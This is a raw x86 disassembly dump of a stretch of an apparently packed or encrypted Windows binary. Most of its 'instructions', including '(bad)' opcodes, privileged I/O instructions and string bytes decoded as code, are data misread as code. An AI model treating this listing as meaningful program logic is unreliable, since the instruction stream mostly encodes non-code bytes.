  41fab6:	lods   eax,DWORD PTR ds:[esi]
  41fab7:	stc    
  41fab8:	adc    DWORD PTR [ecx],ecx
  41faba:	jle    0x41fa71
  41fabc:	push   edi
  41fabd:	iret   
  41fabe:	pop    eax
  41fabf:	scas   eax,DWORD PTR es:[edi]
  41fac0:	push   0xffffffb4
  41fac2:	popf   
  41fac3:	pop    ebp
  41fac4:	stos   DWORD PTR es:[edi],eax
  41fac5:	adc    ebp,DWORD PTR [edx+eiz*4]
  41fac8:	pop    ss
  41fac9:	test   al,0x1d
  41facb:	cdq    
  41facc:	inc    esp
  41facd:	cwde   
  41face:	push   cs
	...
  41fadb:	outs   dx,DWORD PTR ds:[esi]
  41fadc:	mov    ds:0x7edd2ad4,al
  41fae1:	jmp    edi
  41fae3:	push   edx
  41fae4:	fcmovu st,st(5)
  41fae6:	in     eax,0xf4
  41fae8:	mov    WORD PTR [eax+0x1a7f3a4],ds
  41faee:	add    BYTE PTR [eax+eax*1+0x715b0000],ch
  41faf5:	lahf   
  41faf6:	sub    eax,0x6ba051b
  41fafb:	(bad)  
  41fafc:	gs dec esi
  41fafe:	stc    
  41faff:	cli    
  41fb00:	cwde   
  41fb01:	popf   
  41fb02:	fs sahf 
  41fb04:	fsub   DWORD PTR [edx-0x66293404]
  41fb0a:	push   esi
  41fb0b:	add    al,0x8
  41fb0d:	dec    edx
  41fb0e:	dec    edx
  41fb0f:	jb     0x41fa94
  41fb11:	sbb    BYTE PTR [ebp-0x66],dh
  41fb14:	xlat   BYTE PTR ds:[ebx]
  41fb15:	mov    esi,0xdea579a5
  41fb1a:	xchg   DWORD PTR [edx-0x3e59a426],ecx
  41fb20:	rcl    dh,cl
  41fb22:	sub    al,0xa9
  41fb24:	push   cs
  41fb25:	loopne 0x41fb71
  41fb27:	icebp  
  41fb28:	rol    BYTE PTR [edx+0x3d075855],1
  41fb2e:	ror    ebx,0x89
  41fb31:	je     0x41fb1e
  41fb33:	or     al,0x9e
  41fb35:	and    eax,0x189b94e9
  41fb3a:	into   
  41fb3b:	(bad)  
  41fb3c:	mov    dl,0xa7
  41fb3e:	ret    0x6454
  41fb41:	sti    
  41fb42:	adc    bh,al
  41fb44:	sbb    BYTE PTR [edx+0x3c23f189],bh
  41fb4a:	fisub  WORD PTR [ebx-0x1f]
  41fb4d:	xchg   edi,eax
  41fb4e:	cmp    al,0x55
  41fb50:	nop
  41fb51:	retf   
  41fb52:	test   eax,0xf05abcbf
  41fb57:	mov    ds:0x5fc146b5,eax
  41fb5c:	sbb    BYTE PTR [ecx+0x40],bh
  41fb5f:	es mov bh,0x45
  41fb62:	in     al,0x26
  41fb64:	add    eax,0x6b862ace
  41fb69:	sub    edx,DWORD PTR [ebx+edi*1+0x77]
  41fb6d:	sbb    bh,BYTE PTR ds:0x8d86d007
  41fb73:	fmul   st(4),st
  41fb75:	cmc    
  41fb76:	in     al,0x28
  41fb78:	xchg   ebx,eax
  41fb79:	xchg   ecx,eax
  41fb7a:	jle    0x41fbe2
  41fb7c:	push   edi
  41fb7d:	ja     0x41fb4f
  41fb7f:	pop    ss
  41fb80:	xchg   esp,eax
  41fb81:	push   ebp
  41fb82:	sub    cl,BYTE PTR [edx]
  41fb84:	call   0x4c3de40f
  41fb89:	push   edi
  41fb8a:	push   esp
  41fb8b:	xor    eax,0x10facfa9
  41fb90:	repz cmp BYTE PTR [eax+0x21],al
  41fb94:	scas   eax,DWORD PTR es:[edi]
  41fb95:	push   edi
  41fb96:	or     al,0xb6
  41fb98:	fwait
  41fb99:	pop    eax
  41fb9a:	out    dx,eax
  41fb9b:	dec    ecx
  41fb9c:	jecxz  0x41fb64
  41fb9e:	pop    ds
	...
  41fbab:	stc    
  41fbac:	sbb    al,al
  41fbae:	inc    esi
  41fbaf:	jecxz  0x41fb8f
  41fbb1:	(bad)  
  41fbb2:	mov    edi,0xe1f1bc83
  41fbb7:	adc    BYTE PTR [eax],dl
  41fbb9:	jb     0x41fb8f
  41fbbb:	lahf   
  41fbbc:	test   al,0x1
  41fbbe:	add    BYTE PTR [eax+eax*1+0x35190000],ch
  41fbc5:	js     0x41fbe7
  41fbc7:	inc    ecx
  41fbc8:	push   edi
  41fbc9:	dec    esi
  41fbca:	jmp    0x9e41:0xc3c6e097
  41fbd1:	or     al,0x6c
  41fbd3:	and    ch,BYTE PTR [ebx-0x707b71d2]
  41fbd9:	cmp    al,BYTE PTR [eax]
  41fbdb:	(bad)  [ecx]
  41fbdd:	pushf  
  41fbde:	cmp    edi,DWORD PTR [ebp+0x3d874d7f]
  41fbe4:	or     ebx,DWORD PTR [edx]
  41fbe6:	mov    dl,0x11
  41fbe8:	shr    ch,cl
  41fbea:	mov    ebx,0x37a336b7
  41fbef:	and    bh,bl
  41fbf1:	rcr    dh,0x3b
  41fbf4:	aaa    
  41fbf5:	add    edi,0xffffffeb
  41fbf8:	fisub  DWORD PTR [esi]
  41fbfa:	pop    edx
  41fbfb:	shr    ch,cl
  41fbfd:	adc    BYTE PTR [esi],al
  41fbff:	push   edx
  41fc00:	adc    al,0xb5
  41fc02:	sar    BYTE PTR [ecx-0xa],cl
  41fc05:	imul   esp,DWORD PTR [edi-0x55fbd0b9],0x72
  41fc0c:	add    ax,WORD PTR ds:0xe838c69b
  41fc13:	mov    edi,0xeb2efc2a
  41fc18:	or     DWORD PTR [edx],0x2a
  41fc1b:	or     esi,DWORD PTR [edx-0x27]
  41fc1e:	pop    esi
  41fc1f:	cli    
  41fc20:	xchg   ecx,eax
  41fc21:	outs   dx,DWORD PTR ds:[esi]
  41fc22:	iret   
  41fc23:	test   BYTE PTR [edx-0x60f98493],cl
  41fc29:	lds    esi,FWORD PTR [ecx+0x5b]
  41fc2c:	push   0x53
  41fc2e:	(bad)  
  41fc31:	adc    al,0xd1
  41fc33:	(bad)  
  41fc35:	ror    bh,1
  41fc37:	stos   DWORD PTR es:[edi],eax
  41fc38:	pop    ds
  41fc39:	sbb    DWORD PTR [edx-0x5bd08e96],0x9
  41fc40:	pop    esp
  41fc41:	adc    ah,BYTE PTR [esi]
  41fc43:	xchg   esi,eax
  41fc44:	enter  0x7b4d,0x9a
  41fc48:	inc    ecx
  41fc49:	pop    ebx
  41fc4a:	das    
  41fc4b:	mov    fs,WORD PTR [edi-0x18]
  41fc4e:	cmp    DWORD PTR [esi-0xb],edx
  41fc51:	div    BYTE PTR [eax+0x64f3763c]
  41fc57:	sbb    DWORD PTR [edx+0x51225a3e],ebp
  41fc5d:	mov    dh,0x8e
  41fc5f:	xlat   BYTE PTR ds:[ebx]
  41fc60:	das    
  41fc61:	push   0xded6cc2f
  41fc66:	into   
  41fc67:	xlat   BYTE PTR ds:[ebx]
  41fc68:	outs   dx,BYTE PTR ds:[esi]
  41fc69:	jle    0x41fc07
  41fc6b:	adc    eax,0x9546c
	...
  41fc78:	add    BYTE PTR [eax],al
  41fc7a:	add    BYTE PTR [ecx+0x3e8336b9],ah
  41fc80:	(bad)  
  41fc81:	mov    ch,0xbb
  41fc83:	icebp  
  41fc84:	and    eax,0x44f18c27
  41fc89:	in     al,0x49
  41fc8b:	dec    ebx
  41fc8c:	test   eax,0xac0001
  41fc91:	add    BYTE PTR [eax],al
  41fc93:	jle    0x41fc38
  41fc95:	inc    esp
  41fc96:	or     eax,0x8f40fd3a
  41fc9b:	call   FWORD PTR [edi+0x48]
  41fc9e:	cmp    ch,ch
  41fca0:	fild   DWORD PTR [esi+0x5a]
  41fca3:	add    dl,BYTE PTR [eax-0x66]
  41fca6:	jne    0x41fc72
  41fca8:	dec    ecx
  41fca9:	mov    ds:0x4da6ccf2,al
  41fcae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcaf:	das    
  41fcb0:	cs push ss
  41fcb2:	lods   al,BYTE PTR ds:[esi]
  41fcb3:	rcl    BYTE PTR [eax+0x79],0x60
  41fcb7:	int3   
  41fcb8:	mov    ecx,0x146c51f8
  41fcbd:	jecxz  0x41fd0c
  41fcbf:	pushf  
  41fcc0:	test   al,0xc3
  41fcc2:	push   esi
  41fcc3:	popf   
  41fcc4:	mov    ds:0xd9a2e0d8,eax
  41fcc9:	sub    dh,dh
  41fccb:	xor    BYTE PTR [ebx],cl
  41fccd:	dec    DWORD PTR [ecx-0x5b0e0af3]
  41fcd3:	rcl    BYTE PTR [eax+0x7c],0x6c
  41fcd7:	out    0xd9,eax
  41fcd9:	mov    ebp,0x945b3722
  41fcde:	fwait
  41fcdf:	sub    eax,0x920eef9e
  41fce4:	cmp    BYTE PTR [bx+di+0x12a7],dh
  41fce9:	xchg   ebx,eax
  41fcea:	pop    ecx
  41fceb:	repz pop ss
  41fced:	loop   0x41fc8e
  41fcef:	sub    al,BYTE PTR [ecx+0x62]
  41fcf2:	out    0x7a,al
  41fcf4:	cld    
  41fcf5:	cdq    
  41fcf6:	retf   
  41fcf7:	(bad)  
  41fcf8:	mov    ebx,0x63995b68
  41fcfd:	mov    ds:0xd590ee58,eax
  41fd02:	jb     0x41fd0a
  41fd04:	out    dx,eax
  41fd05:	pushf  
  41fd06:	mov    edi,0x20454581
  41fd0b:	or     al,0x9b
  41fd0d:	div    ecx
  41fd0f:	mov    ah,0xc0
  41fd11:	push   eax
  41fd12:	dec    ecx
  41fd13:	ret    
  41fd14:	stc    
  41fd15:	rcl    BYTE PTR [ebx+0x694c31d8],1
  41fd1b:	fs inc ebx
  41fd1d:	cld    
  41fd1e:	jb     0x41fd48
  41fd20:	stc    
  41fd21:	bnd ret 0x8cdc
  41fd25:	mov    edi,0xe3c25e47
  41fd2a:	dec    ecx
  41fd2b:	adc    DWORD PTR [edx+0x40],edi
  41fd2e:	xchg   edx,eax
  41fd2f:	mov    eax,0x24c55470
  41fd34:	lock std 
  41fd36:	cmp    ecx,ebx
  41fd38:	mov    al,ds:0x831e7926
  41fd3d:	jmp    0x0:0xb9
  41fd44:	add    BYTE PTR [eax],al
  41fd46:	add    BYTE PTR [eax],al
  41fd48:	add    BYTE PTR [eax],al
  41fd4a:	add    BYTE PTR [edx],dl
  41fd4c:	xlat   BYTE PTR ds:[ebx]
  41fd4d:	repz or esi,edi
  41fd50:	das    
  41fd51:	cli    
  41fd52:	fist   WORD PTR [ecx]
  41fd54:	dec    ebx
  41fd55:	es nop
  41fd57:	cmp    BYTE PTR [eax-0x560843fb],ah
  41fd5d:	add    DWORD PTR [eax],eax
  41fd5f:	lods   al,BYTE PTR ds:[esi]
  41fd60:	add    BYTE PTR [eax],al
  41fd62:	add    cl,dl
  41fd64:	addr16 add al,0x6
  41fd67:	pop    ebx
  41fd68:	pop    edi
  41fd69:	mov    ebx,0x636598ea
  41fd6e:	cdq    
  41fd6f:	imul   ecx,DWORD PTR [ebp+0x75],0xffffffca
  41fd73:	xor    BYTE PTR [ebx-0x2b],ch
  41fd76:	mov    dh,0x1d
  41fd78:	and    al,BYTE PTR [eax+0x71ffc076]
  41fd7e:	mov    ds:0xf32f358c,eax
  41fd83:	arpl   WORD PTR [eax+esi*4],bx
  41fd86:	aam    0x89
  41fd88:	jecxz  0x41fd8a
  41fd8a:	cwde   
  41fd8b:	outs   dx,BYTE PTR ds:[esi]
  41fd8c:	mov    BYTE PTR [edi],ch
  41fd8e:	(bad)  
  41fd8f:	nop
  41fd90:	mov    bh,BYTE PTR [esi-0x32373d5]
  41fd96:	out    dx,eax
  41fd97:	inc    edx
  41fd98:	mov    dh,0xf4
  41fd9a:	imul   esi,DWORD PTR [edi+0x3d],0x637009d3
  41fda1:	mov    ah,0xe8
  41fda3:	lds    esp,FWORD PTR [edi-0x2e]
  41fda6:	leave  
  41fda7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fda8:	pushf  
  41fda9:	mov    edx,0x25a688c4
  41fdae:	dec    eax
  41fdaf:	ins    BYTE PTR es:[edi],dx
  41fdb0:	mov    WORD PTR [edi],?
  41fdb2:	sub    edx,esp
  41fdb4:	push   ebx
  41fdb5:	xor    DWORD PTR ds:0x883414e2,esp
  41fdbb:	fdiv   DWORD PTR [esi+0xc0101c]
  41fdc1:	iret   
  41fdc2:	or     ebx,0x4403ae63
  41fdc8:	sbb    al,0xaf
  41fdca:	cs scas al,BYTE PTR es:[edi]
  41fdcc:	push   ds
  41fdcd:	(bad)  
  41fdce:	cmp    eax,0x90be685a
  41fdd3:	test   al,0xdd
  41fdd5:	mov    ecx,0x42cc955f
  41fdda:	inc    esp
  41fddb:	or     cl,bl
  41fddd:	sbb    eax,ecx
  41fddf:	cwde   
  41fde0:	icebp  
  41fde1:	stos   BYTE PTR es:[edi],al
  41fde2:	out    dx,eax
  41fde3:	mov    esi,0xe17fdd34
  41fde8:	jnp    0x41fdb1
  41fdea:	fs cmp eax,0x30db1665
  41fdf0:	(bad)  
  41fdf1:	cmc    
  41fdf2:	jno    0x41fe1b
  41fdf4:	lock les edx,FWORD PTR [bp-0x1c]
  41fdf9:	pop    eax
  41fdfa:	in     al,dx
  41fdfb:	and    BYTE PTR [ebp+esi*8-0x20],al
  41fdff:	jne    0x41fe70
  41fe01:	xchg   esi,eax
  41fe02:	cli    
  41fe03:	repnz repz add dh,ah
  41fe07:	cmp    al,0x7
  41fe09:	aas    
  41fe0a:	lods   al,BYTE PTR ds:[esi]
  41fe0b:	xor    bh,dh
  41fe0d:	cmp    BYTE PTR [ebp+0x0],al
	...
  41fe18:	add    BYTE PTR [eax],al
  41fe1a:	add    BYTE PTR [edx],dl
  41fe1c:	mov    edx,0xe6f8c6d8
  41fe21:	push   ds
  41fe22:	(bad)  
  41fe23:	adc    bl,dh
  41fe25:	cwde   
  41fe26:	out    dx,al
  41fe27:	neg    esi
  41fe29:	(bad)  
  41fe2a:	jo     0x41fdcf
  41fe2c:	stos   BYTE PTR es:[edi],al
  41fe2d:	add    DWORD PTR [eax],eax
  41fe2f:	lods   al,BYTE PTR ds:[esi]
  41fe30:	add    BYTE PTR [eax],al
  41fe32:	add    BYTE PTR [ecx],cl
  41fe34:	jbe    0x41fe2b
  41fe36:	jbe    0x41fdff
  41fe38:	push   ds
  41fe39:	and    dl,bl
  41fe3b:	sbb    BYTE PTR [edx+0x3ef7be10],ch
  41fe41:	jg     0x41fe67
  41fe43:	(bad)  
  41fe44:	sub    eax,0xb5d43c60
  41fe49:	mov    eax,cs:0x2ecb57d
  41fe4f:	mov    esi,0xff0b1065
  41fe54:	hlt    
  41fe55:	aad    0x33
  41fe57:	jne    0x41fe21
  41fe59:	pop    edx
  41fe5a:	call   FWORD PTR [edi+0x64]
  41fe5d:	adc    eax,0x4297e19b
  41fe62:	add    eax,0x51f4f343
  41fe67:	or     eax,0x29e08acb
  41fe6c:	and    bh,BYTE PTR [esi+eiz*4-0x76c3f692]
  41fe73:	mov    WORD PTR [edx-0x70641987],cs
  41fe79:	ja     0x41fec6
  41fe7b:	sbb    DWORD PTR ds:0xea4406ab,ebp
  41fe81:	in     eax,dx
  41fe82:	jae    0x41fecd
  41fe84:	scas   eax,DWORD PTR es:[edi]
  41fe85:	mov    ebp,DWORD PTR [ebx]
  41fe87:	xor    al,0xf3
  41fe89:	or     DWORD PTR [esi-0x6d],ecx
  41fe8c:	sub    ebp,eax
  41fe8e:	mov    esi,0x75a14e99
  41fe93:	out    0xed,eax
  41fe95:	and    BYTE PTR [edi+0x62b6af09],al
  41fe9b:	das    
  41fe9c:	jbe    0x41fea9
  41fe9e:	sbb    eax,0x2194b6fc
  41fea3:	jmp    0xfffd:0xf4a52675
  41feaa:	pushf  
  41feab:	and    eax,0x7090633f
  41feb0:	fidiv  DWORD PTR [ebx-0x41787ff2]
  41feb6:	test   eax,0xb06308f4
  41febb:	sbb    ebp,DWORD PTR [edx+ebp*1-0x51f2f04f]
  41fec2:	lock pop eax
  41fec4:	sbb    al,0x7
  41fec6:	jmp    0x3248:0x47cf68fa
  41fecd:	mov    ebx,DWORD PTR ds:0xddb41ab5
  41fed3:	xor    dl,bl
  41fed5:	xor    ch,dl
  41fed7:	sbb    eax,0xd5e96977
  41fedc:	clc    
  41fedd:	mov    eax,ds:0x92
	...
  41feea:	add    BYTE PTR [eax],al
  41feec:	nop
  41feed:	inc    edx
  41feee:	add    BYTE PTR [eax+edx*4],al
  41fef1:	inc    edx
  41fef2:	add    BYTE PTR [eax],cl
  41fef4:	nop
  41fef5:	inc    edx
  41fef6:	add    BYTE PTR [eax+edx*4],cl
  41fef9:	inc    edx
  41fefa:	add    BYTE PTR [eax],dl
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],dl
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],bl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],bl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [esi+0x49],cl
  41ff0d:	dec    esi
  41ff0e:	pop    edi
  41ff0f:	pop    edx
  41ff10:	dec    edx
  41ff11:	inc    ecx
  41ff12:	xor    eax,DWORD PTR [eax]
  41ff14:	push   ebx
  41ff15:	push   edi
  41ff16:	inc    edi
  41ff17:	cmp    DWORD PTR [edi+0x41],ebx
  41ff1a:	pop    eax
  41ff1b:	ss push esi
  41ff1d:	pop    ecx
  41ff1e:	add    BYTE PTR [ebx+0x43],dl
  41ff21:	inc    ebp
  41ff22:	pop    edi
  41ff23:	inc    ecx
  41ff24:	pop    eax
  41ff25:	push   edi
  41ff26:	dec    eax
  41ff27:	inc    edx
  41ff28:	pop    edi
  41ff29:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff2c:	dec    ecx
  41ff2d:	add    BYTE PTR [ecx+0x46],al
  41ff30:	cmp    DWORD PTR [edx],esi
  41ff32:	xor    ebx,DWORD PTR [edi+0x32]
  41ff35:	aaa    
  41ff36:	inc    esp
  41ff37:	inc    esp
  41ff38:	pop    edi
  41ff39:	xor    eax,0x41545800
  41ff3e:	pop    edi
  41ff3f:	push   ecx
  41ff40:	push   esp
  41ff41:	inc    esi
  41ff42:	push   ebp
  41ff43:	cmp    DWORD PTR [eax],eax
  41ff45:	push   edi
  41ff46:	push   ebp
  41ff47:	inc    ecx
  41ff48:	xor    dh,BYTE PTR [ebx]
  41ff4a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff4d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff51:	cmp    DWORD PTR [edi+0x38],ebx
  41ff54:	dec    ecx
  41ff55:	cmp    DWORD PTR [edx+0x36],ebx
  41ff58:	pop    edi
  41ff59:	dec    edx
  41ff5a:	xor    BYTE PTR [edx+0x34],cl
  41ff5d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff61:	xor    esi,DWORD PTR [eax]
  41ff63:	pop    edi
  41ff64:	inc    edx
  41ff65:	dec    ebx
  41ff66:	pop    eax
  41ff67:	pop    eax
  41ff68:	xor    eax,0x51414d00
  41ff6d:	pop    edi
  41ff6e:	inc    ecx
  41ff6f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff72:	inc    ecx
  41ff73:	dec    ebx
  41ff74:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff7a:	inc    ebp
  41ff7b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff7e:	ss dec eax
  41ff80:	dec    ebx
  41ff81:	add    BYTE PTR [ebp+0x57],al
  41ff84:	xor    DWORD PTR [edi+0x31],ebx
  41ff87:	dec    ebx
  41ff88:	xor    eax,DWORD PTR [ecx+0x30]
  41ff8b:	push   ebx
  41ff8c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff90:	aaa    
  41ff91:	pop    edi
  41ff92:	push   edx
  41ff93:	dec    eax
  41ff94:	dec    ebp
  41ff95:	cmp    BYTE PTR [edi+0x37],bl
  41ff98:	inc    esi
  41ff99:	xor    eax,0x35005500
  41ff9e:	add    BYTE PTR [ebx+0x0],al
  41ffa1:	pop    edi
  41ffa2:	add    BYTE PTR [ecx+0x0],bl
  41ffa5:	dec    ecx
  41ffa6:	add    BYTE PTR [ebx+0x0],dl
  41ffa9:	xor    al,BYTE PTR [eax]
  41ffab:	pop    edi
  41ffac:	add    BYTE PTR [edx+0x0],dl
  41ffaf:	add    BYTE PTR [eax],al
  41ffb1:	push   eax
  41ffb2:	add    BYTE PTR [ebp+0x0],dl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [eax],dh
  41ffb8:	add    BYTE PTR [edi+0x0],bl
  41ffbb:	inc    ebx
  41ffbc:	add    BYTE PTR [esi],dh
  41ffbe:	add    BYTE PTR [ebp+0x0],al
  41ffc1:	xor    al,BYTE PTR [eax]
  41ffc3:	pop    edi
  41ffc4:	add    BYTE PTR [ebp+0x0],cl
  41ffc7:	xor    al,0x0
  41ffc9:	dec    edx
  41ffca:	add    BYTE PTR [edx+0x0],dl
  41ffcd:	push   ebp
  41ffce:	add    BYTE PTR [eax],al
  41ffd0:	add    BYTE PTR [esi+0x0],cl
  41ffd3:	cmp    DWORD PTR [eax],eax
  41ffd5:	push   eax
  41ffd6:	add    BYTE PTR [edi+0x0],bl
  41ffd9:	push   ebp
  41ffda:	add    BYTE PTR [ecx],bh
  41ffdc:	add    BYTE PTR [esi],dh
  41ffde:	add    BYTE PTR [eax],dh
  41ffe0:	add    BYTE PTR [ecx],dh
  41ffe2:	add    BYTE PTR [edi+0x0],bl
  41ffe5:	dec    edi
  41ffe6:	add    BYTE PTR [esi+0x0],cl
  41ffe9:	push   esp
  41ffea:	add    BYTE PTR [eax],bh
  41ffec:	add    BYTE PTR [eax],al
  41ffee:	add    BYTE PTR [eax+eax*1+0x34],cl
  41fff2:	add    BYTE PTR [eax+eax*1+0x31],al
  41fff6:	add    BYTE PTR [edi+0x0],bl
  41fff9:	dec    ebx
  41fffa:	add    BYTE PTR [ecx],dh
  41fffc:	add    BYTE PTR [ebp+0x0],al
  41ffff:	pop    edi
  420000:	add    BYTE PTR [edx+0x0],bl
  420003:	add    BYTE PTR [eax],al
  420005:	push   esp
  420006:	add    BYTE PTR [edi],dh
  420008:	add    BYTE PTR [ebx+0x0],al
  42000b:	pop    edi
  42000c:	add    BYTE PTR [edx+0x0],al
  42000f:	xor    al,BYTE PTR [eax]
  420011:	xor    DWORD PTR [eax],eax
  420013:	push   ebx
  420014:	add    BYTE PTR [ecx],dh
  420016:	add    BYTE PTR [ecx],bh
  420018:	add    BYTE PTR [edx+0x0],al
  42001b:	add    BYTE PTR [eax],al
  42001d:	inc    edi
  42001e:	add    BYTE PTR [ebp+0x0],al
  420021:	xor    al,0x0
  420023:	cmp    BYTE PTR [eax],al
  420025:	add    BYTE PTR [eax],al
  420027:	add    BYTE PTR [eax+0x42],dl
  42002a:	add    BYTE PTR [eax+edx*2],al
  42002d:	inc    edx
  42002e:	add    BYTE PTR [eax],cl
  420030:	push   eax
  420031:	inc    edx
  420032:	add    BYTE PTR [eax+edx*2],cl
  420035:	inc    edx
  420036:	add    BYTE PTR [eax],dl
  420038:	push   eax
  420039:	inc    edx
  42003a:	add    BYTE PTR [eax+edx*2],dl
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],bl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],bl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],ah
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],ah
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],ch
  420050:	push   eax
  420051:	inc    edx
	...
  420062:	add    BYTE PTR [eax],al
  420064:	call   0x0:0x4d3ef2
  42006b:	add    BYTE PTR [edx+0x1000200],dl
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [ecx],al
  420075:	add    BYTE PTR [eax],al
  420077:	add    BYTE PTR [ecx],al
  420079:	add    BYTE PTR [eax],al
  42007b:	add    BYTE PTR [eax-0x73fffe00],cl
  420081:	add    BYTE PTR [edx],al
  420083:	add    BYTE PTR [eax-0x23fffe00],dl
  420089:	cmp    al,0x0
  42008b:	add    BYTE PTR [esi+0x200],bl
  420091:	add    BYTE PTR [edi+0x6f],dl
  420094:	jb     0x4200fa
  420096:	push   edi
  420097:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42009e:	aas    
  42009f:	inc    ebx
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	outs   dx,DWORD PTR ds:[esi]
  4200a2:	jae    0x420109
  4200a4:	push   edi
  4200a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200ac:	popa   
  4200ad:	je     0x420118
  4200af:	outs   dx,DWORD PTR ds:[esi]
  4200b0:	outs   dx,BYTE PTR ds:[esi]
  4200b1:	inc    ebx
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	outs   dx,DWORD PTR ds:[esi]
  4200b4:	jae    0x42011b
  4200b6:	push   edi
  4200b7:	imul   eax,DWORD PTR [eax],0x0
	...
